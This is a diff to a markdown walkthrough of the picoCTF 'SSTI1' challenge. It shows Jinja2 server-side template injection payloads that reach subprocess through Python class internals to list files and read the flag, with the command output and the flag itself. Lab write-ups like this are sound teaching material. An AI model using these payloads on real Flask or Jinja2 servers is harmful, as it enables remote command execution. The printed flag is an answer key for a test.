@@ -1,4 +1,4 @@
-###SSTI1###
+<h1> SSTI1 </h1>
 
 From: https://play.picoctf.org/practice/challenge/492
 
@@ -138,35 +138,52 @@ For example, if we want to list the current directory, we can pass the linux com
 
 Sending: {{app.__class__.__mro__[1].__subclasses__()[356](['ls', '-la], stdout=-1).communicate()[0].decode()}}
 
-- Returns:
-- 
+Returns:
+
 total 12
+
 drwxr-xr-x 1 root root    25 Apr 13 03:37 .
+
 drwxr-xr-x 1 root root    23 Apr 13 03:37 ..
+
 drwxr-xr-x 2 root root    32 Apr 13 03:37 __pycache__
+
 -rwxr-xr-x 1 root root  1241 Mar  6 03:27 app.py
+
 -rw-r--r-- 1 root root    58 Mar  6 19:43 flag
+
 -rwxr-xr-x 1 root root   268 Mar  6 03:27 requirements.txt
+
 
 Hooray! Success
 
 It seems like we found the flag file. However, out of curiosity lets check out what the requirements.txt file is first.
 
+
 ÿþblinker==1.8.2
+
 click==8.1.7
+
 colorama==0.4.6
+
 Flask==3.0.3
+
 itsdangerous==2.2.0
+
 Jinja2==3.1.4
+
 MarkupSafe==2.1.5
+
 Werkzeug==3.0.3
+
 
 Seems like just details for the application to run, maybe a docker thing?
 
 Anyways, lets cat the flag with:
+
 {{app.__class__.__mro__[1].__subclasses__()[356](['cat', 'flag'], stdout=-1).communicate()[0].decode()}}
 
-picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
+__picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}__
 
 Whoopee!
 
